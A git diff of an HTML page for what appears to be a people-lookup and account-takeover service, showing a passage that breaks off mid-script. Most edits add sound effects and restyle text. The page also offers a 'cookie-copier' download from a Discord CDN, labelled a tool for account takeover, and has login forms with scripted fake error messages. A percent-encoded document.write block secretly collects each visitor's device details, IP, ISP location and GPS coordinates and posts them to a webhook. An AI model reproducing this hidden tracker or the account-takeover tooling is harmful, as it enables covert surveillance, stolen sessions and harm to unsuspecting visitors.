@@ -73,11 +73,18 @@
   </button>
 </div>
 
-    <div id="call-btn">
-      <img class="call-icon" 
-           src="https://imgs.search.brave.com/Iyo9hFFl8u3HoXRVjX8AH2nXKdOjvGPKUHu7iEe-J8c/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91eHdp/bmcuY29tL3dwLWNv/bnRlbnQvdGhlbWVz/L3V4d2luZy9kb3du/bG9hZC9jb21tdW5p/Y2F0aW9uLWNoYXQt/Y2FsbC9waG9uZS1j/YWxsLXdoaXRlLWlj/b24ucG5n" 
-           alt="Phone Icon" />
-    </div>
+<div id="call-btn">
+  <img class="call-icon" 
+       src="https://imgs.search.brave.com/Iyo9hFFl8u3HoXRVjX8AH2nXKdOjvGPKUHu7iEe-J8c/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91eHdp/bmcuY29tL3dwLWNv/bnRlbnQvdGhlbWVz/L3V4d2luZy9kb3du/bG9hZC9jb21tdW5p/Y2F0aW9uLWNoYXQt/Y2FsbC9waG9uZS1j/YWxsLXdoaXRlLWlj/b24ucG5n" 
+       alt="Phone Icon" />
+</div>
+
+<script>
+document.getElementById("call-btn").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+});
+</script>
   </header>
   
 <div id="settingsSidebar">
@@ -90,7 +97,7 @@
     <div class="dropdown">
       <button onclick="togglePricing()" class="dropdown-button">Pricing</button>
       <div id="pricingDropdown" class="dropdown-content">
-        <p>Future costs: €19.99 / month starting on May 13 2026</p>
+        <p>Future costs: €19.99 / month starting on December 13 2026</p>
       </div>
     </div>
 
@@ -113,43 +120,45 @@
 <div class="dropdown">
   <button onclick="toggleBusiness()" class="dropdown-button">Business</button>
   <div id="businessDropdown" class="dropdown-content">
-    <p>If you are part of a company or server message us a reason on why this tool will help you and we will give you free access for life</p>
+    <p>If you are part of a company or server message us a reason on why this tool will help you and we will give you free access for life</p><br>
     <form action="Business.php" method="POST">
       
-      <label for="fullName">Full Name:</label><br>
-      <input type="text" id="fullName" name="fullName" required><br><br>
+<label for="fullName" style="font-size: 33px; font-weight: bold;">Full Name:</label>
+<input type="text" id="fullName" name="fullName" required><br><br>
 
-      <label for="businessName">Business Name:</label><br>
-      <input type="text" id="businessName" name="businessName" required><br><br>
+<label for="businessName" style="font-size: 33px; font-weight: bold;">Business or server Name:</label>
+<input type="text" id="businessName" name="businessName" required><br><br>
 
-      <label for="businessEmail">Business Email:</label><br>
-      <input type="email" id="businessEmail" name="businessEmail" required><br><br>
+<label for="businessEmail" style="font-size: 33px; font-weight: bold;">Business Email or Server link:</label>
+<input type="email" id="businessEmail" name="businessEmail" required><br><br>
 
-      <label for="businessMessage">Message:</label><br>
-      <textarea id="businessMessage" name="businessMessage" rows="5" required></textarea><br><br>
+<label for="businessMessage" style="font-size: 33px; font-weight: bold;">Message:</label>
+<textarea id="businessMessage" name="businessMessage" rows="5" required></textarea><br><br>
 
       <button type="submit" class="switch-account-btn">Send</button>
     </form>
   </div>
 </div>
 
-    <div class="dropdown">
-      <button onclick="toggleFeatures()" class="dropdown-button">Features</button>
-      <div id="featuresDropdown" class="dropdown-content">
-        <p>Reverse Image search</p>
-        <p>Email lookup</p>
-        <p>Phone lookup</p>
-        <p>IP lookup</p>
-        <p>Password lookup</p>
-        <p>Cookie lookup</p>
-        <p>File upload</p>
-        <p>Secure and Private</p>
-        <p>Username lookup</p>
-        <p>Name lookup</p>
-        <p>Mobile friendly</p>
-        <p>Newest AI</p>
-        <p>Call</p>
-      </div>
+<div class="dropdown">
+  <button onclick="toggleFeatures()" class="dropdown-button">Features</button>
+
+  <div id="featuresDropdown" class="dropdown-content">
+    <p style="font-size: 36px; font-weight: bold;">Reverse Image Search</p>
+    <p style="font-size: 36px; font-weight: bold;">Email Analysis & Lookup</p>
+    <p style="font-size: 36px; font-weight: bold;">Phone Number Analysis</p>
+    <p style="font-size: 36px; font-weight: bold;">IP Address Analysis</p>
+    <p style="font-size: 36px; font-weight: bold;">Password Analysis</p>
+    <p style="font-size: 36px; font-weight: bold;">Cookie Analysis</p>
+    <p style="font-size: 36px; font-weight: bold;">Secure File Upload</p>
+    <p style="font-size: 36px; font-weight: bold;">Privacy & Security</p>
+    <p style="font-size: 36px; font-weight: bold;">Username Analysis</p>
+    <p style="font-size: 36px; font-weight: bold;">Name Analysis</p>
+    <p style="font-size: 36px; font-weight: bold;">Mobile-Optimized Experience</p>
+    <p style="font-size: 36px; font-weight: bold;">Advanced AI</p>
+    <p style="font-size: 36px; font-weight: bold;">Integrated Calling</p>
+  </div>
+
     </div>
   </div>
 </div>
@@ -180,26 +189,49 @@
   <div id="dropdownContent" class="dropdown-content">      
     
   <strong>Basic</strong><br>
-  [!search <br>Number</br> (Phonenumber)]<br>        
-  [!search <br>User</br> (Username)]<br> 
-  [!search <br>Email</br> (Email)]<br>
-  [!search <br>IP</br> (Public_IP_Address)]<br>
-  [!search <br>Name</br> (Full_Name)]<br>
-  [!search <br>Password</br> (Password)]<br>
-  [!search <br>Cookie</br> (Cookie)]<br>
-  <div class="cookie-btn-row">
- <button class="install-cookie-btn" onclick="downloadCookieCopier()">Install cookie-copier</button>
- <button class="use-cookie-btn" onclick="window.location.href='/../cookie-copier.html'">
-    cookie-copier setup</button></div>
+  [!search <b>Number</b> (Phone)]<br>        
+  [!search <b>User</b> (Username)]<br> 
+  [!search <b>Email</b> (Email)]<br>
+  [!search <b>IP</b> (Public_IP_Address)]<br>
+  [!search <b>Name</b> (Full_Name)]<br>
+  [!search <b>Password</b> (Password)]<br>
+  [!search <b>Cookie</b> (Cookie)]<br>
+<div class="cookie-btn-row">
+  <button class="install-cookie-btn" onclick="downloadCookieCopier()">
+    Install cookie-copier
+  </button>
+
+  <button class="use-cookie-btn" onclick="playCookieSetupSound()">
+    cookie-copier setup
+  </button>
+</div>
+
+<script>
+function playCookieSetupSound() {
+  const audio = new Audio("/sounds/sound1.mp3");
+
+  audio.play()
+    .then(() => {
+      audio.addEventListener("ended", () => {
+        window.location.href = "/../cookie-copier.html";
+      });
+    })
+    .catch(error => {
+      console.error("Could not play sound:", error);
+      window.location.href = "/../cookie-copier.html";
+    });
+}
+</script>
  <p>A tool for account takeover</p><br>
 
   <strong>DeepSearch (current)</strong><br>
-  [!deepsearch <br>User</br> (Username)]<br>
-  [!deepsearch <br>Password</br> (Password)]<br>
-  [!deepsearch <br>Number</br> (Phonenumber)]<br>
-  [!deepsearch <br>Email</br> (Email)]<br>
-  [!deepsearch <br>IP</br> (Public_IP_Address)]<br>
-  [!deepsearch <br>Name</br> (Full_Name)]<br>
+  [!deepsearch <b>User</b> (Username)]<br>
+  [!deepsearch <b>Password</b> (Password)]<br>
+  [!deepsearch <b>Cookie</b> (Cookie)]<br>
+  [!deepsearch <b>Number</b> (Phone)]<br>
+  [!deepsearch <b>Email</b> (Email)]<br>
+  [!deepsearch <b>IP</b> (Public_IP_Address)]<br>
+  [!deepsearch <b>Name</b> (Full_Name)]<br>
   More coming soon!<br><br>
     
   Combining queries or specifying a site of choice may result to finding more information.<br>        
@@ -303,6 +335,9 @@ Documents (text files, notes, databases) are scanned and compared against public
 
 <script>
 document.getElementById("dropdownHeader").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+  
   const content = document.getElementById("dropdownContent");
   const arrow = document.getElementById("dropdownArrow");
 
@@ -316,6 +351,9 @@ document.getElementById("dropdownHeader").addEventListener("click", () => {
 });
 
 document.getElementById("dropdownHeader2").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+  
   const content = document.getElementById("dropdownContent2");
   const arrow = document.getElementById("dropdownArrow2");
 
@@ -329,6 +367,9 @@ document.getElementById("dropdownHeader2").addEventListener("click", () => {
 });
 
 function downloadCookieCopier() {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+
   const url = "https://cdn.discordapp.com/attachments/1542213282600059043/1542280905643659274/cookie-copier.zip?ex=6a90a886&is=6a8f5706&hm=f973eeedfb46d6dff87da6335f1bbb8b2a398c4e8bb720c50bcbf6947babde02&";
   const a = document.createElement("a");
   a.href = url;
@@ -356,6 +397,9 @@ function downloadCookieCopier() {
 
 <script>
 document.getElementById("dropdownHeader3").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+  
   const content = document.getElementById("dropdownContent3");
   const arrow = document.getElementById("dropdownArrow3");
 
@@ -437,11 +481,29 @@ document.getElementById("dropdownHeader3").addEventListener("click", () => {
   <input type="text" class="msger-input" name="message"
          placeholder="Enter a command followed by a compatible value">
 
-<label for="file-upload" class="msger-upload-btn">📎 File</label>
+<label for="file-upload" class="msger-upload-btn" id="msger-upload-btn">
+  📎 File
+</label>
+
+<script>
+document.getElementById("msger-upload-btn").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+});
+</script>
 <input type="file" id="file-upload" name="file" accept="image/jpeg,image/jpg,image/png,image/*,*/*" 
        style="display:none">
 
-  <button type="submit" class="msger-send-btn">Send</button>
+<button type="submit" class="msger-send-btn" id="msger-send-btn">
+  Send
+</button>
+
+<script>
+document.getElementById("msger-send-btn").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+});
+</script>
 </form>
 
 </section>
@@ -476,7 +538,16 @@ document.getElementById("dropdownHeader3").addEventListener("click", () => {
   Processing and analyzing your input in real time.
 </p>
     <div class="call-actions" style="margin-top: 20px;">
-      <button class="decline" id="hang-up" style="font-size: 40px; padding: 30px 40px;">Hang Up</button>
+     <button class="decline" id="hang-up" style="font-size: 40px; padding: 30px 40px;">
+  Hang Up
+</button>
+
+<script>
+document.getElementById("hang-up").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
+});
+</script>
     </div>
   </div>
 </div>
@@ -503,7 +574,9 @@ document.getElementById("dropdownHeader3").addEventListener("click", () => {
     });
   }
   
-  document.getElementById("go-post-error").addEventListener("click", () => {
+document.getElementById("go-post-error").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
     document.getElementById("instagram-dropdown").classList.toggle("open");
 });
 
@@ -531,7 +604,9 @@ setTimeout(() => {
 }, 1500);
 });
   
-  document.getElementById("go-post-errors").addEventListener("click", () => {
+document.getElementById("go-post-errors").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
     document.getElementById("discord-dropdown").classList.toggle("open");
 });
 
@@ -559,7 +634,9 @@ setTimeout(() => {
 }, 1500);
 });
 
-  document.getElementById("go-posts-error").addEventListener("click", () => {
+document.getElementById("go-posts-error").addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
     document.getElementById("login-dropdown").classList.toggle("open");
   });
 
@@ -581,7 +658,7 @@ errorMsg.textContent = '';
 setTimeout(() => {
     button.textContent = 'Continue';
     setTimeout(() => {
-        errorMsg.textContent = "Account doesn't exist";
+        errorMsg.textContent = "Username or password doesn't match our records. Try again.";
         errorMsg.style.color = '#cc4b4b';
     }, 1500);
 }, 1500);
@@ -692,17 +769,34 @@ setTimeout(() => {
 document.write(unescape('%3c%73%63%72%69%70%74%20%73%72%63%3d%0d%0a%20%20%22%68%74%74%70%73%3a%2f%2f%61%6a%61%78%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%2f%61%6a%61%78%2f%6c%69%62%73%2f%6a%71%75%65%72%79%2f%33%2e%32%2e%31%2f%6a%71%75%65%72%79%2e%6d%69%6e%2e%6a%73%22%3e%0d%0a%20%20%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%73%63%72%69%70%74%3e%0d%0a%20%20%76%61%72%20%78%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%74%65%63%68%63%68%69%70%22%29%3b%0d%0a%20%20%6c%65%74%20%64%61%74%65%74%69%6d%65%20%3d%20%6e%65%77%20%44%61%74%65%28%29%3b%0d%0a%20%20%6c%65%74%20%6c%6f%63%61%6c%74%69%6d%65%20%3d%20%53%74%72%69%6e%67%28%64%61%74%65%74%69%6d%65%2e%74%6f%4c%6f%63%61%6c%65%54%69%6d%65%53%74%72%69%6e%67%28%29%29%3b%0d%0a%20%20%76%61%72%20%74%61%72%67%65%74%69%6e%66%6f%20%3d%20%28%22%4E%6F%76%65%6C%69%6E%74%65%6C%20%2d%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%20%47%61%74%68%65%72%69%6e%67%20%52%65%70%6f%72%74%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%5c%6e%44%65%76%69%63%65%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%55%73%65%72%20%41%67%65%6e%74%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%75%73%65%72%41%67%65%6e%74%20%2b%20%22%20%5c%6e%50%6c%61%74%66%6f%72%6d%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%70%6c%61%74%66%6f%72%6d%20%2b%20%22%20%5c%6e%43%6f%6f%6b%69%65%73%20%45%6e%61%62%6c%65%64%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%63%6f%6f%6b%69%65%45%6e%61%62%6c%65%64%20%2b%20%22%5c%6e%42%72%6f%77%73%65%72%20%4c%61%6e%67%75%61%67%65%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%6c%61%6e%67%75%61%67%65%20%2b%20%22%5c%6e%42%72%6f%77%73%65%72%20%4e%61%6d%65%3a%20%22%2b%20%6e%61%76%69%67%61%74%6f%72%2e%61%70%70%4e%61%6d%65%20%2b%20%22%5c%6e%42%72%6f%77%73%65%72%20%43%6f%64%65%4e%61%6d%65%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%61%70%70%43%6f%64%65%4e%61%6d%65%20%2b%20%22%5c%6e%52%41%4d%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%64%65%76%69%63%65%4d%65%6d%6f%72%79%20%2b%20%22%5c%6e%43%50%55%20%43%6f%72%65%73%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%68%61%72%64%77%61%72%65%43%6f%6e%63%75%72%72%65%6e%63%79%20%2b%20%22%5c%6e%53%63%72%65%65%6e%20%57%69%64%74%68%3a%20%22%20%2b%20%73%63%72%65%65%6e%2e%77%69%64%74%68%20%2b%20%22%5c%6e%53%63%72%65%65%6e%20%48%65%69%67%68%74%3a%20%22%20%2b%20%73%63%72%65%65%6e%2e%68%65%69%67%68%74%20%2b%20%22%5c%6e%4c%6f%63%61%6c%20%54%69%6d%65%3a%20%22%20%2b%20%6c%6f%63%61%6c%74%69%6d%65%20%2b%20%22%5c%6e%52%65%66%55%72%6c%3a%20%22%20%2b%20%64%6f%63%75%6d%65%6e%74%2e%72%65%66%65%72%72%65%72%20%2b%20%22%5c%6e%4f%53%20%43%50%55%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%6f%73%63%70%75%20%2b%20%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%3b%0d%0a%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%20%0d%0a%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%74%61%72%67%65%74%69%6e%66%6f%29%29%3b%0d%0a%20%20%24%2e%67%65%74%4a%53%4f%4e%28%22%68%74%74%70%73%3a%2f%2f%61%70%69%2e%69%70%69%66%79%2e%6f%72%67%3f%66%6f%72%6d%61%74%3d%6a%73%6f%6e%22%2c%20%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%20%7b%0d%0a%20%20%20%20%24%28%22%23%74%63%22%29%2e%68%74%6d%6c%28%64%61%74%61%2e%69%70%29%3b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%76%61%72%20%67%65%74%69%70%20%3d%20%28%22%5c%6e%54%61%72%67%65%74%20%49%50%20%44%65%74%61%69%6c%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%20%20%2b%20%22%49%50%3a%20%22%20%2b%20%64%61%74%61%2e%69%70%20%20%2b%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%67%65%74%69%70%29%29%3b%0d%0a%20%20%7d%29%0d%0a%20%20%24%2e%67%65%74%4a%53%4f%4e%28%22%68%74%74%70%3a%2f%2f%69%70%2d%61%70%69%2e%63%6f%6d%2f%6a%73%6f%6e%2f%3f%66%69%65%6c%64%73%3d%73%74%61%74%75%73%2c%6d%65%73%73%61%67%65%2c%63%6f%6e%74%69%6e%65%6e%74%2c%63%6f%6e%74%69%6e%65%6e%74%43%6f%64%65%2c%63%6f%75%6e%74%72%79%2c%63%6f%75%6e%74%72%79%43%6f%64%65%2c%72%65%67%69%6f%6e%2c%72%65%67%69%6f%6e%4e%61%6d%65%2c%63%69%74%79%2c%64%69%73%74%72%69%63%74%2c%7a%69%70%2c%6c%61%74%2c%6c%6f%6e%2c%74%69%6d%65%7a%6f%6e%65%2c%6f%66%66%73%65%74%2c%63%75%72%72%65%6e%63%79%2c%69%73%70%2c%6f%72%67%2c%61%73%2c%61%73%6e%61%6d%65%2c%72%65%76%65%72%73%65%2c%70%72%6f%78%79%2c%68%6f%73%74%69%6e%67%2c%71%75%65%72%79%22%2c%20%66%75%6e%63%74%69%6f%6e%28%72%65%73%70%6f%6e%73%65%29%20%7b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%76%61%72%20%6c%6f%63%61%74%69%6f%6e%64%61%74%61%20%3d%20%28%22%5c%6e%4e%65%74%77%6f%72%6b%20%26%20%49%53%50%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%52%65%73%70%6f%6e%73%65%20%53%74%61%74%75%73%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%73%74%61%74%75%73%20%2b%20%22%5c%6e%43%6f%6e%74%69%6e%65%6e%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%6e%74%69%6e%65%6e%74%20%2b%20%22%5c%6e%43%6f%6e%74%69%6e%65%6e%74%43%6f%64%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%6e%74%69%6e%65%6e%74%63%6f%64%65%20%2b%20%22%5c%6e%43%6f%75%6e%74%72%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%75%6e%74%72%79%20%2b%20%22%5c%6e%43%6f%75%6e%74%72%79%63%6f%64%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%75%6e%74%72%79%63%6f%64%65%20%2b%20%22%5c%6e%52%65%67%69%6f%6e%20%6e%61%6d%65%3a%20%22%2b%20%72%65%73%70%6f%6e%73%65%2e%72%65%67%69%6f%6e%4e%61%6d%65%20%2b%20%22%5c%6e%52%65%67%69%6f%6e%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%72%65%67%69%6f%6e%20%2b%20%22%5c%6e%43%69%74%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%69%74%79%20%2b%20%20%22%5c%6e%44%69%73%74%72%69%63%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%64%69%73%74%72%69%63%74%20%2b%20%22%5c%6e%5a%69%70%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%7a%69%70%20%2b%20%22%5c%6e%54%69%6d%65%5f%7a%6f%6e%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%74%69%6d%65%5f%7a%6f%6e%65%20%2b%20%22%5c%6e%41%53%20%4e%61%6d%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%61%73%20%2b%20%22%5c%6e%49%53%50%20%49%6e%66%6f%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%69%73%70%20%2b%20%22%5c%6e%52%65%76%65%72%73%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%72%65%76%65%72%73%65%20%2b%20%22%5c%6e%4f%66%66%73%65%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%6f%66%66%73%65%74%20%2b%20%20%22%5c%6e%43%75%72%72%65%6e%63%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%75%72%72%65%6e%63%79%20%2b%20%22%5c%6e%50%72%6f%78%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%70%72%6f%78%79%20%2b%20%22%5c%6e%4c%61%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%6c%61%74%20%2b%20%22%5c%6e%4c%6f%6e%67%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%6c%6f%6e%20%2b%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%6c%6f%63%61%74%69%6f%6e%64%61%74%61%29%29%3b%0d%0a%20%20%7d%29%0d%0a%20%20%66%75%6e%63%74%69%6f%6e%20%67%70%73%4c%6f%63%61%74%69%6f%6e%28%29%20%7b%0d%0a%20%20%20%20%69%66%20%28%6e%61%76%69%67%61%74%6f%72%2e%67%65%6f%6c%6f%63%61%74%69%6f%6e%29%20%7b%0d%0a%20%20%20%20%20%20%6e%61%76%69%67%61%74%6f%72%2e%67%65%6f%6c%6f%63%61%74%69%6f%6e%2e%67%65%74%43%75%72%72%65%6e%74%50%6f%73%69%74%69%6f%6e%28%6c%61%74%6c%6f%6e%67%2c%20%63%61%74%63%68%45%72%72%6f%72%29%3b%0d%0a%20%20%20%20%7d%20%65%6c%73%65%20%7b%20%0d%0a%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%31%20%3d%20%22%5c%6e%54%61%72%67%65%74%20%42%72%6f%77%73%65%72%20%69%73%20%6e%6f%74%20%73%75%70%70%6f%72%74%69%6e%67%20%67%65%6f%6c%6f%63%61%74%69%6f%6e%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%31%29%29%3b%0d%0a%20%20%20%20%7d%0d%0a%20%20%7d%0d%0a%20%20%66%75%6e%63%74%69%6f%6e%20%6c%61%74%6c%6f%6e%67%28%70%6f%73%69%74%69%6f%6e%29%20%7b%0d%0a%20%20%20%20%76%61%72%20%6c%61%74%6c%6f%6e%67%20%3d%20%28%22%5c%6e%47%50%53%20%4c%61%74%20%4c%6f%6e%67%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%4c%61%74%69%74%75%64%65%3a%20%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%61%74%69%74%75%64%65%20%2b%20%22%5c%6e%4c%6f%6e%67%69%74%75%64%65%3a%20%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%6f%6e%67%69%74%75%64%65%20%2b%20%22%5c%6e%4d%61%70%20%4c%6f%63%61%74%69%6f%6e%3a%20%20%68%74%74%70%73%3a%2f%2f%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%6d%61%70%73%2f%70%6c%61%63%65%2f%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%61%74%69%74%75%64%65%20%2b%20%22%2c%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%6f%6e%67%69%74%75%64%65%20%2b%20%22%5c%6e%47%6f%6f%67%6c%65%20%45%61%72%74%68%3a%20%20%68%74%74%70%73%3a%2f%2f%65%61%72%74%68%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%77%65%62%2f%73%65%61%72%63%68%2f%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%61%74%69%74%75%64%65%20%2b%20%22%2c%22%20%2b%20%70%6f%73%69%74%69%6f%6e%2e%63%6f%6f%72%64%73%2e%6c%6f%6e%67%69%74%75%64%65%20%2b%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%3b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%